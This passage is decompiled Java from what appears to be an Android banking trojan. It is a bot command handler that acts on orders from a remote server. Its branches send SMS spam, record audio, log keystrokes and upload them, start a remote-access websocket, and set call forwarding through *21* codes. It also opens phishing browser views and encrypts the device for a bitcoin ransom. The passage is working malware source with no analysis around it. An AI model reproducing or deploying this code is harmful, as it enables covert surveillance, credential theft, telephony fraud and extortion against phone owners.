        L_0x0b2e:
            r5 = r3[r4]
            java.lang.String r9 = "|spam="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0b6e
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0b65 }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0b65 }
            java.lang.String r10 = "|spam="
            java.lang.String r11 = "|endspam"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0b65 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0b65 }
            java.lang.String r10 = "spam"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x0b65 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0b65 }
            java.lang.String r10 = "textSPAM"
            r9.mo233d(r1, r10, r5)     // Catch:{ Exception -> 0x0b65 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0b65 }
            java.lang.String r9 = "spamSMS"
            java.lang.String r10 = "start"
            r5.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0b65 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0b65 }
            java.lang.String r9 = "indexSMSSPAM"
            java.lang.String r10 = ""
            r5.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0b65 }
            goto L_0x0b6e
        L_0x0b65:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "spam -> Commands"
            r5.mo213a(r9, r10)
        L_0x0b6e:
            r5 = r3[r4]
            java.lang.String r9 = "|recordsound="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0bc2
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0bb9 }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0bb9 }
            java.lang.String r10 = "|recordsound="
            java.lang.String r11 = "|endrecord"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0bb9 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0bb9 }
            java.lang.String r10 = "seconds"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x0bb9 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0bb9 }
            wocwvy.czyxoxmbauu.slsa.a r10 = r1.f572c     // Catch:{ Exception -> 0x0bb9 }
            java.lang.String[] r10 = r10.f340g     // Catch:{ Exception -> 0x0bb9 }
            r11 = 0
            r10 = r10[r11]     // Catch:{ Exception -> 0x0bb9 }
            boolean r9 = r9.mo229c(r1, r10)     // Catch:{ Exception -> 0x0bb9 }
            if (r9 == 0) goto L_0x0bc2
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0bb9 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf> r10 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.class
            boolean r9 = r9.mo215a(r1, r10)     // Catch:{ Exception -> 0x0bb9 }
            if (r9 != 0) goto L_0x0bc2
            android.content.Context r9 = r1.f573d     // Catch:{ Exception -> 0x0bb9 }
            android.content.Intent r10 = new android.content.Intent     // Catch:{ Exception -> 0x0bb9 }
            android.content.Context r11 = r1.f573d     // Catch:{ Exception -> 0x0bb9 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf> r12 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.class
            r10.<init>(r11, r12)     // Catch:{ Exception -> 0x0bb9 }
            java.lang.String r11 = "time"
            android.content.Intent r5 = r10.putExtra(r11, r5)     // Catch:{ Exception -> 0x0bb9 }
            r9.startService(r5)     // Catch:{ Exception -> 0x0bb9 }
            goto L_0x0bc2
        L_0x0bb9:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "RecodrSound -> Commands"
            r5.mo213a(r9, r10)
        L_0x0bc2:
            r5 = r3[r4]
            java.lang.String r9 = "|replaceurl="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0bf7
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0bee }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0bee }
            java.lang.String r10 = "|replaceurl="
            java.lang.String r11 = "|endurl"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0bee }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0bee }
            java.lang.String r10 = "Replace URL Panel"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x0bee }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0bee }
            java.lang.String r10 = "url"
            r9.mo233d(r1, r10, r5)     // Catch:{ Exception -> 0x0bee }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0bee }
            java.lang.String r10 = "urls"
            r9.mo233d(r1, r10, r5)     // Catch:{ Exception -> 0x0bee }
            goto L_0x0bf7
        L_0x0bee:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "ReplaceURL -> Commands"
            r5.mo213a(r9, r10)
        L_0x0bf7:
            r5 = r3[r4]
            java.lang.String r9 = "|startapplication="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0c29
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0c20 }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0c20 }
            java.lang.String r10 = "|startapplication="
            java.lang.String r11 = "|endapp"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0c20 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0c20 }
            java.lang.String r10 = "Start App"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x0c20 }
            android.content.pm.PackageManager r9 = r18.getPackageManager()     // Catch:{ Exception -> 0x0c20 }
            android.content.Intent r5 = r9.getLaunchIntentForPackage(r5)     // Catch:{ Exception -> 0x0c20 }
            r1.startActivity(r5)     // Catch:{ Exception -> 0x0c20 }
            goto L_0x0c29
        L_0x0c20:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "Start App -> Commands"
            r5.mo213a(r9, r10)
        L_0x0c29:
            r5 = r3[r4]
            java.lang.String r9 = "killBot"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0c62
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0c59 }
            java.lang.String r9 = "url"
            java.lang.String r10 = ""
            r5.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0c59 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0c59 }
            java.lang.String r9 = "urls"
            java.lang.String r10 = ""
            r5.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0c59 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0c59 }
            java.lang.String r9 = "urlInj"
            java.lang.String r10 = ""
            r5.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0c59 }
            android.content.Intent r5 = new android.content.Intent     // Catch:{ Exception -> 0x0c59 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wfveenegvz> r9 = wocwvy.czyxoxmbauu.slsa.wfveenegvz.class
            r5.<init>(r1, r9)     // Catch:{ Exception -> 0x0c59 }
            r1.stopService(r5)     // Catch:{ Exception -> 0x0c59 }
            goto L_0x0c62
        L_0x0c59:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "killBot -> Commands"
            r5.mo213a(r9, r10)
        L_0x0c62:
            r5 = r3[r4]
            java.lang.String r9 = "getkeylogger"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0cdc
            java.lang.String r5 = "keys.log"
            java.lang.String r5 = r1.mo450a(r5)     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r9 = "|^|"
            java.lang.String r10 = "\n"
            java.lang.String r5 = r5.replace(r9, r10)     // Catch:{ Exception -> 0x0cd5 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r10 = "12"
            java.lang.StringBuilder r11 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0cd5 }
            r11.<init>()     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r12 = "p="
            r11.append(r12)     // Catch:{ Exception -> 0x0cd5 }
            wocwvy.czyxoxmbauu.slsa.b r12 = r1.f571b     // Catch:{ Exception -> 0x0cd5 }
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0cd5 }
            r13.<init>()     // Catch:{ Exception -> 0x0cd5 }
            wocwvy.czyxoxmbauu.slsa.b r14 = r1.f571b     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r14 = r14.mo247q(r1)     // Catch:{ Exception -> 0x0cd5 }
            r13.append(r14)     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r14 = "~~~~~~~~~~"
            r13.append(r14)     // Catch:{ Exception -> 0x0cd5 }
            r13.append(r5)     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r5 = r13.toString()     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r5 = r12.mo225c(r5)     // Catch:{ Exception -> 0x0cd5 }
            r11.append(r5)     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r5 = r11.toString()     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r5 = r9.mo218b(r1, r10, r5)     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r9 = "SEND KEL"
            java.lang.String r10 = "LOGER"
            android.util.Log.e(r9, r10)     // Catch:{ Exception -> 0x0cd5 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r5 = r9.mo230d(r5)     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r9 = "clear"
            boolean r5 = r5.contains(r9)     // Catch:{ Exception -> 0x0cd5 }
            if (r5 == 0) goto L_0x0cdc
            java.lang.String r5 = "SEND KEL"
            java.lang.String r9 = "CLEAR"
            android.util.Log.e(r5, r9)     // Catch:{ Exception -> 0x0cd5 }
            java.lang.String r5 = "keys.log"
            r1.mo452b(r5)     // Catch:{ Exception -> 0x0cd5 }
            goto L_0x0cdc
        L_0x0cd5:
            java.lang.String r5 = "ERROR"
            java.lang.String r9 = "getkeylogger -> Commands"
            android.util.Log.e(r5, r9)
        L_0x0cdc:
            r5 = r3[r4]
            java.lang.String r9 = "|startrat="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0d24
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0d1b }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0d1b }
            java.lang.String r10 = "|endrat="
            java.lang.String r11 = "|endurl"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0d1b }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0d1b }
            java.lang.String r10 = "WebSocket"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x0d1b }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0d1b }
            java.lang.String r10 = "websocket"
            r9.mo233d(r1, r10, r5)     // Catch:{ Exception -> 0x0d1b }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0d1b }
            android.content.Context r9 = r1.f573d     // Catch:{ Exception -> 0x0d1b }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.xelytgswelv> r10 = wocwvy.czyxoxmbauu.slsa.xelytgswelv.class
            boolean r5 = r5.mo215a(r9, r10)     // Catch:{ Exception -> 0x0d1b }
            if (r5 != 0) goto L_0x0d24
            android.content.Context r5 = r1.f573d     // Catch:{ Exception -> 0x0d1b }
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x0d1b }
            android.content.Context r10 = r1.f573d     // Catch:{ Exception -> 0x0d1b }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.xelytgswelv> r11 = wocwvy.czyxoxmbauu.slsa.xelytgswelv.class
            r9.<init>(r10, r11)     // Catch:{ Exception -> 0x0d1b }
            r5.startService(r9)     // Catch:{ Exception -> 0x0d1b }
            goto L_0x0d24
        L_0x0d1b:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "WebSocket -> Commands"
            r5.mo213a(r9, r10)
        L_0x0d24:
            r5 = r3[r4]
            java.lang.String r9 = "startforward="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0d6b
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0d62 }
            r5.mo242l(r1)     // Catch:{ Exception -> 0x0d62 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0d62 }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0d62 }
            java.lang.String r10 = "startforward="
            java.lang.String r11 = "|endforward"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0d62 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0d62 }
            java.lang.String r10 = "Number"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x0d62 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0d62 }
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0d62 }
            r10.<init>()     // Catch:{ Exception -> 0x0d62 }
            java.lang.String r11 = "*21*"
            r10.append(r11)     // Catch:{ Exception -> 0x0d62 }
            r10.append(r5)     // Catch:{ Exception -> 0x0d62 }
            java.lang.String r5 = "#"
            r10.append(r5)     // Catch:{ Exception -> 0x0d62 }
            java.lang.String r5 = r10.toString()     // Catch:{ Exception -> 0x0d62 }
            r9.mo222b(r1, r5)     // Catch:{ Exception -> 0x0d62 }
            goto L_0x0d6b
        L_0x0d62:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "Start Forward -> Commands"
            r5.mo213a(r9, r10)
        L_0x0d6b:
            r5 = r3[r4]
            java.lang.String r9 = "stopforward"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0d8b
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0d82 }
            r5.mo242l(r1)     // Catch:{ Exception -> 0x0d82 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0d82 }
            java.lang.String r9 = "#21#"
            r5.mo222b(r1, r9)     // Catch:{ Exception -> 0x0d82 }
            goto L_0x0d8b
        L_0x0d82:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "STOP Forward -> Commands"
            r5.mo213a(r9, r10)
        L_0x0d8b:
            r5 = r3[r4]
            java.lang.String r9 = "|openbrowser="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0dd9
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0dd0 }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0dd0 }
            java.lang.String r10 = "|openbrowser="
            java.lang.String r11 = "|endbrowser"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0dd0 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0dd0 }
            java.lang.String r10 = "url"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x0dd0 }
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x0dd0 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.dzudmx> r10 = wocwvy.czyxoxmbauu.slsa.ncec.dzudmx.class
            r9.<init>(r1, r10)     // Catch:{ Exception -> 0x0dd0 }
            java.lang.String r10 = "start"
            java.lang.StringBuilder r11 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0dd0 }
            r11.<init>()     // Catch:{ Exception -> 0x0dd0 }
            java.lang.String r12 = "**startbrurl**"
            r11.append(r12)     // Catch:{ Exception -> 0x0dd0 }
            r11.append(r5)     // Catch:{ Exception -> 0x0dd0 }
            java.lang.String r5 = r11.toString()     // Catch:{ Exception -> 0x0dd0 }
            android.content.Intent r5 = r9.putExtra(r10, r5)     // Catch:{ Exception -> 0x0dd0 }
            r5.addFlags(r8)     // Catch:{ Exception -> 0x0dd0 }
            r5.addFlags(r7)     // Catch:{ Exception -> 0x0dd0 }
            r1.startActivity(r5)     // Catch:{ Exception -> 0x0dd0 }
            goto L_0x0dd9
        L_0x0dd0:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "Open Browser URL -> Commands"
            r5.mo213a(r9, r10)
        L_0x0dd9:
            r5 = r3[r4]
            java.lang.String r9 = "|openactivity="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0e16
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0e0d }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0e0d }
            java.lang.String r10 = "|openactivity="
            java.lang.String r11 = "|endactivity"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0e0d }
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x0e0d }
            android.content.Context r10 = r1.f573d     // Catch:{ Exception -> 0x0e0d }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.khypzruy> r11 = wocwvy.czyxoxmbauu.slsa.ncec.khypzruy.class
            r9.<init>(r10, r11)     // Catch:{ Exception -> 0x0e0d }
            java.lang.String r10 = "url"
            android.content.Intent r5 = r9.putExtra(r10, r5)     // Catch:{ Exception -> 0x0e0d }
            r5.addFlags(r8)     // Catch:{ Exception -> 0x0e0d }
            r8 = 8388608(0x800000, float:1.17549435E-38)
            r5.addFlags(r8)     // Catch:{ Exception -> 0x0e0d }
            r5.addFlags(r7)     // Catch:{ Exception -> 0x0e0d }
            r1.startActivity(r5)     // Catch:{ Exception -> 0x0e0d }
            goto L_0x0e16
        L_0x0e0d:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r7 = "ERROR"
            java.lang.String r8 = "Open Activity URL -> Commands"
            r5.mo213a(r7, r8)
        L_0x0e16:
            r5 = r3[r4]
            java.lang.String r7 = "|cryptokey="
            boolean r5 = r5.contains(r7)
            if (r5 == 0) goto L_0x0e88
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0e7d }
            r7 = r3[r4]     // Catch:{ Exception -> 0x0e7d }
            java.lang.String r8 = "|cryptokey="
            java.lang.String r9 = "|endcrypt"
            java.lang.String r5 = r5.mo208a(r7, r8, r9)     // Catch:{ Exception -> 0x0e7d }
            java.lang.String r7 = "/:/"
            java.lang.String[] r5 = r5.split(r7)     // Catch:{ Exception -> 0x0e7d }
            r7 = 0
            r8 = r5[r7]     // Catch:{ Exception -> 0x0e7d }
            r7 = 1
            r9 = r5[r7]     // Catch:{ Exception -> 0x0e7d }
            r7 = 2
            r5 = r5[r7]     // Catch:{ Exception -> 0x0e7e }
            wocwvy.czyxoxmbauu.slsa.b r10 = r1.f571b     // Catch:{ Exception -> 0x0e7e }
            wocwvy.czyxoxmbauu.slsa.a r11 = r1.f572c     // Catch:{ Exception -> 0x0e7e }
            java.lang.String[] r11 = r11.f336c     // Catch:{ Exception -> 0x0e7e }
            r12 = 0
            r11 = r11[r12]     // Catch:{ Exception -> 0x0e7e }
            boolean r10 = r10.mo229c(r1, r11)     // Catch:{ Exception -> 0x0e7e }
            if (r10 == 0) goto L_0x0e89
            wocwvy.czyxoxmbauu.slsa.b r10 = r1.f571b     // Catch:{ Exception -> 0x0e7e }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wahiuolww> r11 = wocwvy.czyxoxmbauu.slsa.wahiuolww.class
            boolean r10 = r10.mo215a(r1, r11)     // Catch:{ Exception -> 0x0e7e }
            if (r10 != 0) goto L_0x0e89
            wocwvy.czyxoxmbauu.slsa.b r10 = r1.f571b     // Catch:{ Exception -> 0x0e7e }
            java.lang.String r11 = "lock_amount"
            r10.mo233d(r1, r11, r9)     // Catch:{ Exception -> 0x0e7e }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0e7e }
            java.lang.String r10 = "lock_btc"
            r9.mo233d(r1, r10, r5)     // Catch:{ Exception -> 0x0e7e }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0e7e }
            java.lang.String r9 = "status"
            java.lang.String r10 = "crypt"
            r5.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0e7e }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0e7e }
            java.lang.String r9 = "key"
            r5.mo233d(r1, r9, r8)     // Catch:{ Exception -> 0x0e7e }
            android.content.Intent r5 = new android.content.Intent     // Catch:{ Exception -> 0x0e7e }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wahiuolww> r8 = wocwvy.czyxoxmbauu.slsa.wahiuolww.class
            r5.<init>(r1, r8)     // Catch:{ Exception -> 0x0e7e }
            r1.startService(r5)     // Catch:{ Exception -> 0x0e7e }
            goto L_0x0e89
        L_0x0e7d:
            r7 = 2
        L_0x0e7e:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r8 = "ERROR"
            java.lang.String r9 = "WebSocket -> Commands"
            r5.mo213a(r8, r9)
            goto L_0x0e89
        L_0x0e88:
            r7 = 2
        L_0x0e89:
            r5 = r3[r4]
            java.lang.String r8 = "|decryptokey="
            boolean r5 = r5.contains(r8)
            if (r5 == 0) goto L_0x0ee2
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0ed9 }
            r8 = r3[r4]     // Catch:{ Exception -> 0x0ed9 }
            java.lang.String r9 = "|decryptokey="
            java.lang.String r10 = "|enddecrypt"
            java.lang.String r5 = r5.mo208a(r8, r9, r10)     // Catch:{ Exception -> 0x0ed9 }
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b     // Catch:{ Exception -> 0x0ed9 }
            wocwvy.czyxoxmbauu.slsa.a r9 = r1.f572c     // Catch:{ Exception -> 0x0ed9 }
            java.lang.String[] r9 = r9.f336c     // Catch:{ Exception -> 0x0ed9 }
            r10 = 0
            r9 = r9[r10]     // Catch:{ Exception -> 0x0ed9 }
            boolean r8 = r8.mo229c(r1, r9)     // Catch:{ Exception -> 0x0ed9 }
            if (r8 == 0) goto L_0x0ee2
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b     // Catch:{ Exception -> 0x0ed9 }
            android.content.Context r9 = r1.f573d     // Catch:{ Exception -> 0x0ed9 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wahiuolww> r10 = wocwvy.czyxoxmbauu.slsa.wahiuolww.class
            boolean r8 = r8.mo215a(r9, r10)     // Catch:{ Exception -> 0x0ed9 }
            if (r8 != 0) goto L_0x0ee2
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b     // Catch:{ Exception -> 0x0ed9 }
            java.lang.String r9 = "status"
            java.lang.String r10 = "decrypt"
            r8.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0ed9 }
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b     // Catch:{ Exception -> 0x0ed9 }
            java.lang.String r9 = "key"
            r8.mo233d(r1, r9, r5)     // Catch:{ Exception -> 0x0ed9 }
            android.content.Context r5 = r1.f573d     // Catch:{ Exception -> 0x0ed9 }
            android.content.Intent r8 = new android.content.Intent     // Catch:{ Exception -> 0x0ed9 }
            android.content.Context r9 = r1.f573d     // Catch:{ Exception -> 0x0ed9 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wahiuolww> r10 = wocwvy.czyxoxmbauu.slsa.wahiuolww.class
            r8.<init>(r9, r10)     // Catch:{ Exception -> 0x0ed9 }
            r5.startService(r8)     // Catch:{ Exception -> 0x0ed9 }
            goto L_0x0ee2
        L_0x0ed9:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r8 = "ERROR"
            java.lang.String r9 = "WebSocket -> Commands"
            r5.mo213a(r8, r9)
        L_0x0ee2:
            r5 = r3[r4]
            java.lang.String r8 = "getIP"
            boolean r5 = r5.contains(r8)
            if (r5 == 0) goto L_0x0f3f
            wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b r5 = new wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b
            r5.<init>()
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b
            android.content.Context r9 = r1.f573d
            java.lang.String r10 = "4"
            java.lang.StringBuilder r11 = new java.lang.StringBuilder
            r11.<init>()
            java.lang.String r12 = "p="
            r11.append(r12)
            wocwvy.czyxoxmbauu.slsa.b r12 = r1.f571b
            java.lang.StringBuilder r13 = new java.lang.StringBuilder
            r13.<init>()
            r13.append(r2)
            java.lang.String r14 = "|IP bots: "
            r13.append(r14)
            wocwvy.czyxoxmbauu.slsa.b r14 = r1.f571b
            java.lang.String r15 = "http://en.utrace.de"
            java.lang.String r7 = ""
            java.lang.String r5 = r5.mo364b(r15, r7)
            java.lang.String r7 = ">The IP address "
            java.lang.String r15 = " is located in the"
            java.lang.String r5 = r14.mo208a(r5, r7, r15)
            r13.append(r5)
            r13.append(r6)
            java.lang.String r5 = "|"
            r13.append(r5)
            java.lang.String r5 = r13.toString()
            java.lang.String r5 = r12.mo225c(r5)
            r11.append(r5)
            java.lang.String r5 = r11.toString()
            r8.mo218b(r9, r10, r5)
        L_0x0f3f:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0f78 }
            android.content.Context r6 = r1.f573d     // Catch:{ Exception -> 0x0f78 }
            java.lang.String r7 = "network"
            java.lang.String r5 = r5.mo234e(r6, r7)     // Catch:{ Exception -> 0x0f78 }
            java.lang.String r6 = "true"
            boolean r5 = r5.equals(r6)     // Catch:{ Exception -> 0x0f78 }
            if (r5 == 0) goto L_0x0f5b
            android.content.Intent r5 = new android.content.Intent     // Catch:{ Exception -> 0x0f78 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.frvvkgp> r6 = wocwvy.czyxoxmbauu.slsa.frvvkgp.class
            r5.<init>(r1, r6)     // Catch:{ Exception -> 0x0f78 }
            r1.startService(r5)     // Catch:{ Exception -> 0x0f78 }
        L_0x0f5b:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0f78 }
            android.content.Context r6 = r1.f573d     // Catch:{ Exception -> 0x0f78 }
            java.lang.String r7 = "gps"
            java.lang.String r5 = r5.mo234e(r6, r7)     // Catch:{ Exception -> 0x0f78 }
            java.lang.String r6 = "true"
            boolean r5 = r5.equals(r6)     // Catch:{ Exception -> 0x0f78 }
            if (r5 == 0) goto L_0x0f81
            android.content.Intent r5 = new android.content.Intent     // Catch:{ Exception -> 0x0f78 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.blkzyyyfc> r6 = wocwvy.czyxoxmbauu.slsa.blkzyyyfc.class
            r5.<init>(r1, r6)     // Catch:{ Exception -> 0x0f78 }
            r1.startService(r5)     // Catch:{ Exception -> 0x0f78 }
            goto L_0x0f81
        L_0x0f78:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r6 = "ukhakhcgifofl"
            java.lang.String r7 = "ERROR -> blkzyyyfc"
            r5.mo213a(r6, r7)
        L_0x0f81:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0fb5 }
            android.content.Context r6 = r1.f573d     // Catch:{ Exception -> 0x0fb5 }
            java.lang.String r7 = "htmllocker"
            java.lang.String r5 = r5.mo234e(r6, r7)     // Catch:{ Exception -> 0x0fb5 }
            int r5 = r5.length()     // Catch:{ Exception -> 0x0fb5 }
            r6 = 15
            if (r5 >= r6) goto L_0x0fbe
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0fb5 }
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b     // Catch:{ Exception -> 0x0fb5 }
            android.content.Context r8 = r1.f573d     // Catch:{ Exception -> 0x0fb5 }
            java.lang.String r9 = "11"
            java.lang.String r10 = "p=1"
